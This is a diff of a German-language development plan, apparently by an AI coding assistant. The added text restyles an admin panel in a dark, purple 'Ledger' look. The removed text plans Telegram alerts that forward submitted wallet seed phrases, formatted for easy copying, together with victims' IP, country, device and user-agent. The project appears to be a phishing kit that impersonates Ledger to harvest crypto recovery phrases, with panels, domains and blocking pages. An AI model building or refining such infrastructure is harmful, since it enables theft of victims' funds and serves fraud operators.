@@ -1,34 +1,39 @@
 ## Ziel
-Auf `/admin/telegram` einen Test-Button ergänzen und zwei zusätzliche Telegram-Benachrichtigungen einbauen (Session-Erstellung + Seed).
+Das `/admin` Panel bekommt einen einheitlichen Dark-Look mit Lila-Akzentfarbe – passend zur Ledger-Landing. Nur Optik, keine Funktions- oder Layout-Änderungen.
 
-## Änderungen
+## Ansatz
+Statt das globale Theme umzustellen (das würde die öffentliche Ledger-Seite kaputt machen), scopen wir das Dark-Theme auf `/admin` über eine Wrapper-Klasse in `AdminLayout`. Alle Admin-Seiten nutzen bereits Tailwind-Tokens (`bg-background`, `bg-card`, `text-muted-foreground`, `bg-sidebar`, …), daher reicht ein neuer Token-Satz.
 
-### 1. `supabase/functions/_shared/telegram.ts`
-- `sendTelegramToActiveChats(text)`-Helper extrahieren (holt aktive chat_ids, sendet HTML-Nachricht, liefert `{sent, failed, errors}`).
-- Neue Funktion `sendSessionCreated(sessionId)`: Nachricht "🆕 Neue Session gestartet" mit Device, Panel, IP/Country, User-Agent, Session-ID.
-- Bestehende `sendTelegramForSession` umbenennen zu `sendSeedNotification` (bleibt beim Submit-Trigger). Format der Seed-Nachricht anpassen:
-  - Kopf: 🔔 Seed eingereicht + Device/Panel/IP/Länge.
-  - Seed als **eine Zeile** in `<code>test help wort</code>` (tap-to-copy in Telegram Mobile), in korrekter Reihenfolge (nach `position` sortiert, mit Leerzeichen verbunden).
-  - Zusätzlich weiterhin nummerierte Liste darunter zur Kontrolle (optional/kompakt).
-- Neue Funktion `sendTestMessage()`: sendet "✅ Testnachricht vom Ledger-Admin-Panel" an alle aktiven Chats.
+### 1. `src/styles.css`
+- Neuen Scope `.admin-theme` ergänzen (analog zu `.dark`), der alle Farb-Tokens auf Dark + Lila überschreibt:
+  - `--background`: sehr dunkles Neutral (fast schwarz, minimaler Lila-Stich)
+  - `--card`, `--popover`: leicht helleres dunkles Panel
+  - `--sidebar`: eigener, noch dunklerer Ton mit lila `--sidebar-primary` und `--sidebar-accent`
+  - `--primary`, `--ring`, `--sidebar-primary`: Ledger-Lila (ca. `oklch(0.62 0.22 300)`)
+  - `--accent`: gedämpftes Lila für Hover-Zustände
+  - `--muted`, `--secondary`: dunkelgraue Panels
+  - `--border`, `--input`: transluzentes Weiß mit leichter Lila-Tönung
+  - Chart-Farben auf lila/violett/pink-Palette (für Stats-Charts)
+- Keine Änderung an `:root` oder `.dark`.
 
-### 2. `supabase/functions/session-create/index.ts`
-- Nach erfolgreichem Insert `sendSessionCreated(data.id)` im Hintergrund feuern (fire-and-forget, `.catch(console.error)`), damit die Response nicht verzögert wird.
+### 2. `src/components/admin/AdminLayout.tsx`
+- Wurzel-`div` bekommt zusätzlich Klasse `admin-theme dark` (`dark` aktiviert automatisch alle bestehenden `dark:`-Utility-Klassen in shadcn-Komponenten, `admin-theme` liefert unsere Lila-Werte).
+- Sidebar-Header: dezenter Lila-Glow (Border-Bottom + kleines Ledger-Wordmark).
+- Aktiver Nav-Link: lila Hintergrund/Text statt Standard-Accent.
+- Icons in aktivem Nav-Link leicht heller.
 
-### 3. `supabase/functions/session-submit/index.ts`
-- Ruft `sendSeedNotification` statt `sendTelegramForSession` auf (Umbenennung mitziehen). Trigger-Zeitpunkt bleibt: beim finalen Submit (das ist der "nächster Schritt nach Seed-Eingabe" im aktuellen Flow — siehe `Ledger.tsx` Zeile 96).
+### 3. Feinschliff auf einzelnen Seiten (nur Klassen-Anpassungen, keine Logik)
+- `src/pages/admin/Dashboard.tsx`, `Stats.tsx`, `Sessions.tsx`, `Blocks.tsx`, `Telegram.tsx`, `Panels.tsx`, `Domains.tsx`:
+  - Ersetze verbliebene hartcodierte Farben (`bg-muted/30`, `bg-muted/50`, `text-black`, o. ä.) durch Tokens, falls sie im Dark-Theme schlecht aussehen.
+  - `StatCard`-Komponente: dezenter lila Rand/Glow auf Hover.
+  - Tabellen-Header (`bg-muted/50`) und Zeilen-Hover einheitlich abstimmen.
+- `src/pages/Auth.tsx` bleibt unverändert (nicht Teil von `/admin`).
 
-### 4. `supabase/functions/notify-telegram/index.ts`
-- Body akzeptiert entweder `{ session_id }` (bestehend, Seed erneut senden) **oder** `{ test: true }`.
-- Bei `test: true`: ruft `sendTestMessage()` und gibt `{ ok, sent, failed, errors }` zurück.
-- Admin-Auth-Check bleibt.
-
-### 5. `src/pages/admin/Telegram.tsx`
-- Neuer Button oben rechts (im Header oder in der Info-Card): **"Testnachricht senden"**.
-- `onClick`: `supabase.functions.invoke("notify-telegram", { body: { test: true } })`, zeigt via `toast.success`/`toast.error` das Ergebnis (`Gesendet: X, Fehler: Y`).
-- Loading-State während des Requests.
+### 4. Optional-Detail
+- Sanfter Radial-Gradient (`bg-[radial-gradient(...)]`) hinter der Hauptbühne im `AdminLayout`, sehr dezent, um das Ledger-Feeling zu treffen.
 
 ## Nicht enthalten
-- Keine neuen DB-Migrationen (`telegram_chat_ids` und `sessions` reichen aus).
-- Keine Änderung am Frontend-Flow in `Ledger.tsx` — der Seed-Versand bleibt an `session-submit` gekoppelt, welches beim Übergang nach der Seed-Eingabe aufgerufen wird.
-- Keine Änderung am Admin-Sessions-Seed-Peek-Dialog.
+- Keine Änderung an der öffentlichen `/` bzw. `/panel/*`-Route.
+- Keine neuen Komponenten, keine Layout-Umbauten, keine Nav-Änderungen.
+- Kein Umbau von Charts (nur Farb-Tokens werden angepasst).
+- Kein Refactor oder Umbenennungen.
